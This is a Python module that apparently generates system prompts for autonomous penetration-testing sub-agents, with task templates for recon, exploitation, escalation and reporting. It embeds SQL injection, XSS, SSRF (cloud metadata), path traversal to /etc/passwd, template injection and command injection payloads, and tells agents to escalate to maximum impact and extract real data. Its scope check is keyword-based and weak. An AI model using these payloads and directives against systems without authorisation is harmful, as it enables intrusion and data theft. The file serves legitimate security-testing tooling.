"""
Dynamic Prompt Generator for Inferno.

Generates task-specific system prompts for sub-agents based on:
- Current task type (recon, exploit, validate, report)
- Detected technology stack
- MITRE ATT&CK techniques relevant to the task
- Specific tool hints for the situation
- Scope enforcement

This module is EXTERNAL to the supervisor to avoid clogging context.

Philosophy:
- Less is more - smaller prompts = better focus
- Task-specific > general methodology
- Tool hints > academic lectures
- Runtime scope enforcement > static boilerplate
"""

from __future__ import annotations

from dataclasses import dataclass, field
from enum import Enum

import structlog

# Import MITRE ATT&CK mapping
try:
    from inferno.core.mitre_attack import get_technique_for_vuln

    MITRE_AVAILABLE = True
except ImportError:
    MITRE_AVAILABLE = False

logger = structlog.get_logger(__name__)


class TaskType(str, Enum):
    """Types of tasks for sub-agents."""

    RECON = "recon"
    ENUMERATE = "enumerate"
    EXPLOIT = "exploit"
    VALIDATE = "validate"
    ESCALATE = "escalate"
    REPORT = "report"
    CUSTOM = "custom"


class TechStack(str, Enum):
    """Detected technology stacks."""

    PHP = "php"
    PYTHON = "python"
    NODE = "node"
    JAVA = "java"
    DOTNET = "dotnet"
    RUBY = "ruby"
    GO = "go"
    WORDPRESS = "wordpress"
    DRUPAL = "drupal"
    LARAVEL = "laravel"
    DJANGO = "django"
    FLASK = "flask"
    EXPRESS = "express"
    SPRING = "spring"
    ASPNET = "aspnet"
    RAILS = "rails"
    GENERIC_WEB = "generic_web"
    API = "api"
    GRAPHQL = "graphql"
    UNKNOWN = "unknown"


@dataclass
class TaskContext:
    """Context for generating a task-specific prompt."""

    task_type: TaskType
    target: str
    scope: str
    objective: str

    # What we know about the target
    tech_stack: list[TechStack] = field(default_factory=list)
    detected_services: list[str] = field(default_factory=list)
    detected_endpoints: list[str] = field(default_factory=list)

    # What's already been tried/found
    previous_findings: list[str] = field(default_factory=list)
    failed_attempts: list[str] = field(default_factory=list)

    # Hints from parent agent
    hints: list[str] = field(default_factory=list)
    focus_areas: list[str] = field(default_factory=list)

    # Constraints
    max_time_seconds: int = 300
    stay_quiet: bool = False  # Avoid noisy scans

    # Custom instructions
    custom_instructions: str = ""


# =============================================================================
# Tool Recommendations by Task and Tech Stack
# =============================================================================

RECON_TOOLS = {
    "default": [
        ("nmap -sV -sC {target}", "Service detection with default scripts"),
        (
            "gobuster dir -u {target} -w /usr/share/wordlists/dirb/common.txt -t 50",
            "Directory enumeration",
        ),
        ("whatweb {target}", "Technology fingerprinting"),
        ("curl -I {target}", "HTTP headers inspection"),
    ],
    TechStack.WORDPRESS: [
        ("wpscan --url {target} --enumerate vp,vt,u", "WordPress vulnerability scan"),
        ("curl {target}/wp-json/wp/v2/users", "WordPress user enumeration"),
    ],
    TechStack.API: [
        ("curl {target}/swagger.json", "Check for Swagger docs"),
        ("curl {target}/openapi.json", "Check for OpenAPI docs"),
        ("curl {target}/api/", "Probe API root"),
    ],
    TechStack.GRAPHQL: [
        (
            "curl -X POST {target}/graphql -H 'Content-Type: application/json' -d '{{\"query\":\"{{__schema{{types{{name}}}}}}\"}}' ",
            "GraphQL introspection",
        ),
    ],
}

EXPLOIT_TOOLS = {
    "sqli": [
        ("sqlmap -u '{url}' --batch --dbs", "Automated SQL injection"),
        ("sqlmap -u '{url}' --batch --tables -D {db}", "Dump tables"),
        ("' OR '1'='1", "Basic SQLi payload"),
        ("' UNION SELECT NULL,NULL,NULL--", "Union-based SQLi"),
        ("'; WAITFOR DELAY '0:0:5'--", "Time-based blind SQLi (MSSQL)"),
        ("' AND SLEEP(5)--", "Time-based blind SQLi (MySQL)"),
    ],
    "xss": [
        ("<script>alert(document.domain)</script>", "Basic XSS"),
        ("<img src=x onerror=alert(1)>", "Event handler XSS"),
        ("javascript:alert(1)", "JavaScript protocol"),
        ("<svg onload=alert(1)>", "SVG-based XSS"),
    ],
    "ssrf": [
        ("http://localhost:80", "Localhost probe"),
        ("http://127.0.0.1:22", "Internal SSH"),
        ("http://169.254.169.254/latest/meta-data/", "AWS metadata"),
        ("http://metadata.google.internal/", "GCP metadata"),
        ("file:///etc/passwd", "File protocol"),
    ],
    "lfi": [
        ("../../../etc/passwd", "Path traversal"),
        ("....//....//....//etc/passwd", "Double encoding bypass"),
        ("php://filter/convert.base64-encode/resource=index.php", "PHP wrapper"),
        ("/proc/self/environ", "Environment variables"),
    ],
    "ssti": [
        ("{{7*7}}", "Jinja2/Twig test"),
        ("${7*7}", "Freemarker/Velocity test"),
        ("<%= 7*7 %>", "ERB test"),
        ("#{7*7}", "Ruby test"),
    ],
    "command_injection": [
        ("; id", "Command separator"),
        ("| id", "Pipe injection"),
        ("$(id)", "Command substitution"),
        ("`id`", "Backtick injection"),
    ],
}

VALIDATION_APPROACHES = {
    "sqli": "Re-run with different payload variant to confirm, extract actual data",
    "xss": "Verify payload executes in browser context, check if stored/reflected",
    "ssrf": "Confirm internal access with unique canary URL or OOB callback",
    "lfi": "Read a known file, verify contents match expected",
    "rce": "Execute unique command with identifiable output",
}


# =============================================================================
# Prompt Templates (Minimal, Task-Focused)
# =============================================================================

CORE_IDENTITY = """You are a pentesting agent.

TARGET: {target}
SCOPE: {scope}
OBJECTIVE: {objective}

RULES:
- Stay in scope. Never attack {scope_exclusions}.
- EXPLOIT vulnerabilities (verified-only = 20% penalty)
- get_strategy() before attacks, record_success/failure after
- Don't repeat failed approaches"""

RECON_PROMPT = """
## Your Task: Reconnaissance

Map the attack surface. Find:
1. Open ports and services
2. Technology stack (frameworks, languages, versions)
3. Entry points (forms, APIs, upload endpoints)
4. Interesting files (robots.txt, sitemap.xml, .git)

### Recommended Commands
{tool_hints}

### What to Look For
- Version numbers (CVE opportunities)
- Default credentials panels
- Debug/admin endpoints
- API documentation
- Error messages revealing internals

### Output
Store findings in memory:
```
memory_store(content="[FINDING]", type="recon", tags=["recon"])
```

Move fast. Get the lay of the land."""

ENUMERATE_PROMPT = """
## Your Task: Enumeration

Deep dive into discovered services. For each endpoint:
1. Map all parameters (GET, POST, headers, cookies)
2. Identify input validation patterns
3. Find hidden parameters (param mining)
4. Understand business logic

### Detected Technologies
{tech_stack}

### Endpoints to Enumerate
{endpoints}

### Focus Areas
{focus_areas}

### MITRE ATT&CK Context
{attack_context}

Go parameter by parameter. Find the gaps."""

EXPLOIT_PROMPT = """
## Your Task: Exploitation

Exploit the identified vulnerability.

### Target Vulnerability
{vuln_type} at {location}

### Recommended Payloads
{payloads}

### MITRE ATT&CK Technique
{attack_technique}

### Exploitation Strategy
1. Confirm vulnerability with safe payload
2. Escalate to maximum impact
3. Extract proof (data, shell, access)
4. Document exact reproduction steps

### Previous Attempts (Don't Repeat)
{failed_attempts}

### Success Criteria
{success_criteria}

Prove the bug. Extract real data or demonstrate real impact."""

VALIDATE_PROMPT = """
## Your Task: Validation

Independently verify the reported finding.

### Finding to Validate
{finding_summary}

### Original Evidence
{original_evidence}

### Validation Approach
{validation_approach}

### What Makes It Valid
- Can reproduce with same steps?
- Works with different payload variant?
- Real data extracted, not just error message?
- Impact is as claimed?

### What Makes It Invalid
- Only worked once (flaky)
- Detection without exploitation
- Theoretical impact, not proven
- Out of scope

Be skeptical. Confirm or reject with evidence."""

ESCALATE_PROMPT = """
## Your Task: Escalation

You found a vulnerability. Now maximize impact.

### Current Finding
{current_finding}

### Escalation Paths
{escalation_paths}

### MITRE ATT&CK Escalation Techniques
{attack_escalation}

### Questions to Answer
1. Can you get from this to admin access?
2. Can you access other users' data?
3. Can you chain with another vulnerability?
4. Can you achieve RCE from this?

### Caution
- Don't lose what you have (save current PoC)
- Test escalation carefully
- Document each step

Turn a medium into a critical."""

REPORT_PROMPT = """
## Your Task: Generate Report

### Findings to Report
{findings}

### Report Format
For EACH finding:

**[SEVERITY] Title**
- Location: exact endpoint
- Impact: what you actually achieved
- Proof: exact command/request + response
- Remediation: how to fix

### Severity Guide
- CRITICAL: RCE, auth bypass, mass data breach (PROVEN)
- HIGH: Other user data access, privesc (PROVEN)
- MEDIUM: Limited impact exploitation (PROVEN)
- LOW: Minor issues (CONFIRMED)
- INFO: Observations only

### Quality Check
- Every finding has reproduction steps?
- Evidence shows actual exploitation?
- No "could" or "might" language?

Generate the report."""


# =============================================================================
# Dynamic Prompt Generator
# =============================================================================


class DynamicPromptGenerator:
    """
    Generates task-specific prompts for sub-agents.

    External to supervisor to avoid context bloat.
    Each prompt is minimal and focused on the specific task.
    """

    def __init__(self) -> None:
        """Initialize the generator."""
        self._logger = structlog.get_logger(__name__)

    def generate(self, context: TaskContext) -> str:
        """
        Generate a task-specific prompt.

        Args:
            context: Task context with all relevant information

        Returns:
            Generated prompt string, minimal and focused
        """
        # Build core identity (always included, ~100 tokens)
        scope_exclusions = self._extract_exclusions(context.scope)
        core = CORE_IDENTITY.format(
            target=context.target,
            scope=context.scope,
            objective=context.objective,
            scope_exclusions=scope_exclusions,
        )

        # Generate task-specific section
        task_section = self._generate_task_section(context)

        # Add custom instructions if provided
        custom = ""
        if context.custom_instructions:
            custom = f"\n\n## Additional Instructions\n{context.custom_instructions}"

        # Combine (total should be ~500-1000 tokens, not 13,000)
        prompt = f"{core}\n\n{task_section}{custom}"

        self._logger.info(
            "prompt_generated",
            task_type=context.task_type.value,
            prompt_length=len(prompt),
            tech_stack=[t.value for t in context.tech_stack],
        )

        return prompt

    def _generate_task_section(self, context: TaskContext) -> str:
        """Generate the task-specific section of the prompt."""

        if context.task_type == TaskType.RECON:
            return self._generate_recon_prompt(context)
        elif context.task_type == TaskType.ENUMERATE:
            return self._generate_enumerate_prompt(context)
        elif context.task_type == TaskType.EXPLOIT:
            return self._generate_exploit_prompt(context)
        elif context.task_type == TaskType.VALIDATE:
            return self._generate_validate_prompt(context)
        elif context.task_type == TaskType.ESCALATE:
            return self._generate_escalate_prompt(context)
        elif context.task_type == TaskType.REPORT:
            return self._generate_report_prompt(context)
        else:
            return self._generate_custom_prompt(context)

    def _generate_recon_prompt(self, context: TaskContext) -> str:
        """Generate reconnaissance prompt with relevant tools."""
        # Get tool hints based on detected tech or default
        tool_hints = []

        # Always include default recon tools
        for cmd, desc in RECON_TOOLS["default"]:
            tool_hints.append(f"- `{cmd.format(target=context.target)}` - {desc}")

        # Add tech-specific tools
        for tech in context.tech_stack:
            if tech in RECON_TOOLS:
                for cmd, desc in RECON_TOOLS[tech]:
                    tool_hints.append(f"- `{cmd.format(target=context.target)}` - {desc}")

        return RECON_PROMPT.format(
            tool_hints="\n".join(tool_hints)
            if tool_hints
            else "Use standard reconnaissance tools.",
        )

    def _generate_enumerate_prompt(self, context: TaskContext) -> str:
        """Generate enumeration prompt with tech context."""
        # Format tech stack
        tech_str = (
            ", ".join([t.value for t in context.tech_stack]) if context.tech_stack else "Unknown"
        )

        # Format endpoints
        endpoints_str = (
            "\n".join([f"- {ep}" for ep in context.detected_endpoints[:10]])
            if context.detected_endpoints
            else "- Discover endpoints during enumeration"
        )

        # Format focus areas
        focus_str = (
            "\n".join([f"- {f}" for f in context.focus_areas])
            if context.focus_areas
            else "- Map all parameters\n- Find hidden functionality"
        )

        # Get MITRE ATT&CK context
        attack_context = self._get_attack_context_for_recon(context.tech_stack)

        return ENUMERATE_PROMPT.format(
            tech_stack=tech_str,
            endpoints=endpoints_str,
            focus_areas=focus_str,
            attack_context=attack_context,
        )

    def _generate_exploit_prompt(self, context: TaskContext) -> str:
        """Generate exploitation prompt with specific payloads and ATT&CK mapping."""
        # Extract vuln type and location from hints/focus areas
        vuln_type = "unknown"
        location = context.target

        for hint in context.hints + context.focus_areas:
            hint_lower = hint.lower()
            for vt in ["sqli", "xss", "ssrf", "lfi", "ssti", "command_injection", "rce"]:
                if vt in hint_lower:
                    vuln_type = vt
                    break
            if "at " in hint_lower or "endpoint" in hint_lower:
                # Try to extract location
                parts = hint.split()
                for i, p in enumerate(parts):
                    if p.lower() in ("at", "endpoint", "url"):
                        if i + 1 < len(parts):
                            location = parts[i + 1]

        # Get payloads for vuln type
        payloads = EXPLOIT_TOOLS.get(vuln_type, EXPLOIT_TOOLS.get("sqli", []))
        payload_str = "\n".join([f"- `{p[0]}` - {p[1]}" for p in payloads[:6]])

        # Get MITRE ATT&CK technique
        attack_technique = "T1190 (Exploit Public-Facing Application)"
        if MITRE_AVAILABLE:
            techniques = get_technique_for_vuln(vuln_type)
            if techniques and len(techniques) > 0:
                technique = techniques[0]  # Get first/primary technique
                attack_technique = f"{technique.technique_id} ({technique.name})"

        # Format failed attempts
        failed_str = (
            "\n".join([f"- {f}" for f in context.failed_attempts[:5]])
            if context.failed_attempts
            else "None yet"
        )

        # Success criteria based on vuln type
        success_map = {
            "sqli": "Extract actual database records (usernames, emails, etc.)",
            "xss": "Achieve JavaScript execution in victim context (alert or cookie theft)",
            "ssrf": "Access internal service data or cloud metadata",
            "lfi": "Read sensitive file contents (/etc/passwd, config files)",
            "rce": "Execute arbitrary command and show output (id, whoami)",
            "ssti": "Achieve code execution via template injection",
        }
        success_criteria = success_map.get(vuln_type, "Prove exploitation with concrete evidence")

        return EXPLOIT_PROMPT.format(
            vuln_type=vuln_type.upper(),
            location=location,
            payloads=payload_str,
            attack_technique=attack_technique,
            failed_attempts=failed_str,
            success_criteria=success_criteria,
        )

    def _generate_validate_prompt(self, context: TaskContext) -> str:
        """Generate validation prompt."""
        # Extract finding info from hints
        finding_summary = context.hints[0] if context.hints else "Finding details not provided"
        original_evidence = (
            context.hints[1] if len(context.hints) > 1 else "Check memory for evidence"
        )

        # Get validation approach based on vuln type
        vuln_type = "unknown"
        for hint in context.hints:
            for vt in VALIDATION_APPROACHES:
                if vt in hint.lower():
                    vuln_type = vt
                    break

        validation_approach = VALIDATION_APPROACHES.get(
            vuln_type, "Re-test with different approach to confirm"
        )

        return VALIDATE_PROMPT.format(
            finding_summary=finding_summary,
            original_evidence=original_evidence,
            validation_approach=validation_approach,
        )

    def _generate_escalate_prompt(self, context: TaskContext) -> str:
        """Generate escalation prompt with ATT&CK techniques."""
        # Current finding
        current_finding = context.hints[0] if context.hints else "Current finding not specified"

        # Escalation paths based on what was found
        escalation_paths = [
            "- Can you access admin functionality?",
            "- Can you read/modify other users' data?",
            "- Can you chain with another endpoint?",
            "- Can you achieve code execution?",
        ]

        # MITRE ATT&CK escalation techniques
        attack_escalation = """- T1068 (Exploitation for Privilege Escalation)
- T1078 (Valid Accounts) - if credentials found
- T1055 (Process Injection) - if code execution achieved"""

        return ESCALATE_PROMPT.format(
            current_finding=current_finding,
            escalation_paths="\n".join(escalation_paths),
            attack_escalation=attack_escalation,
        )

    def _generate_report_prompt(self, context: TaskContext) -> str:
        """Generate reporting prompt."""
        # Format findings
        findings_str = (
            "\n".join([f"- {f}" for f in context.previous_findings])
            if context.previous_findings
            else "Retrieve findings from memory"
        )

        return REPORT_PROMPT.format(findings=findings_str)

    def _generate_custom_prompt(self, context: TaskContext) -> str:
        """Generate custom task prompt."""
        return f"""
## Your Task: {context.objective}

### Context
{context.custom_instructions if context.custom_instructions else "Complete the specified objective."}

### Hints
{chr(10).join(["- " + h for h in context.hints]) if context.hints else "No specific hints provided."}

### Focus Areas
{chr(10).join(["- " + f for f in context.focus_areas]) if context.focus_areas else "Use your judgment."}

Execute the task efficiently."""

    def _extract_exclusions(self, scope: str) -> str:
        """Extract scope exclusions for the prompt."""
        # Simple extraction of what's NOT in scope
        exclusions = []

        scope_lower = scope.lower()
        if "only" in scope_lower:
            exclusions.append("anything outside the specified target")
        if "production" not in scope_lower:
            exclusions.append("production systems")
        if "third" in scope_lower or "external" in scope_lower:
            exclusions.append("third-party services")

        return ", ".join(exclusions) if exclusions else "out-of-scope targets"

    def _get_attack_context_for_recon(self, tech_stack: list[TechStack]) -> str:
        """Get relevant ATT&CK techniques for enumeration."""
        if not MITRE_AVAILABLE:
            return "Use standard enumeration techniques."

        techniques = []

        # Map tech stack to relevant techniques
        tech_to_vuln = {
            TechStack.PHP: ["sqli", "lfi", "rce"],
            TechStack.PYTHON: ["ssti", "command_injection"],
            TechStack.NODE: ["ssrf", "prototype_pollution"],
            TechStack.JAVA: ["deserialization", "xxe"],
            TechStack.WORDPRESS: ["sqli", "auth_bypass", "lfi"],
            TechStack.API: ["idor", "auth_bypass", "ssrf"],
            TechStack.GRAPHQL: ["injection", "introspection", "dos"],
        }

        for tech in tech_stack:
            if tech in tech_to_vuln:
                for vuln in tech_to_vuln[tech]:
                    technique_list = get_technique_for_vuln(vuln)
                    if technique_list and len(technique_list) > 0:
                        technique = technique_list[0]
                        techniques.append(
                            f"- {technique.technique_id}: {technique.name} (common for {tech.value})"
                        )

        if not techniques:
            techniques.append("- T1190: Exploit Public-Facing Application")
            techniques.append("- T1059: Command and Scripting Interpreter")

        return "\n".join(techniques[:5])  # Limit to 5 to keep prompt small


# =============================================================================
# Convenience Functions
# =============================================================================


def generate_prompt(
    task_type: str | TaskType,
    target: str,
    scope: str,
    objective: str,
    tech_stack: list[str] | None = None,
    hints: list[str] | None = None,
    focus_areas: list[str] | None = None,
    previous_findings: list[str] | None = None,
    failed_attempts: list[str] | None = None,
    custom_instructions: str = "",
) -> str:
    """
    Generate a task-specific prompt.

    Convenience function for the DynamicPromptGenerator.

    Args:
        task_type: Type of task (recon, exploit, validate, etc.)
        target: Target URL/IP
        scope: Scope definition
        objective: What to achieve
        tech_stack: Detected technologies
        hints: Hints from parent agent
        focus_areas: Areas to focus on
        previous_findings: Already discovered findings
        failed_attempts: Things that didn't work
        custom_instructions: Additional instructions

    Returns:
        Generated prompt string
    """
    # Convert string task_type to enum
    if isinstance(task_type, str):
        task_type = TaskType(task_type.lower())

    # Convert string tech stack to enums
    tech_enums = []
    if tech_stack:
        for tech in tech_stack:
            try:
                tech_enums.append(TechStack(tech.lower()))
            except ValueError:
                tech_enums.append(TechStack.UNKNOWN)

    context = TaskContext(
        task_type=task_type,
        target=target,
        scope=scope,
        objective=objective,
        tech_stack=tech_enums,
        hints=hints or [],
        focus_areas=focus_areas or [],
        previous_findings=previous_findings or [],
        failed_attempts=failed_attempts or [],
        custom_instructions=custom_instructions,
    )

    generator = DynamicPromptGenerator()
    return generator.generate(context)


# Singleton instance
_generator: DynamicPromptGenerator | None = None


def get_generator() -> DynamicPromptGenerator:
    """Get the singleton prompt generator."""
    global _generator
    if _generator is None:
        _generator = DynamicPromptGenerator()
    return _generator
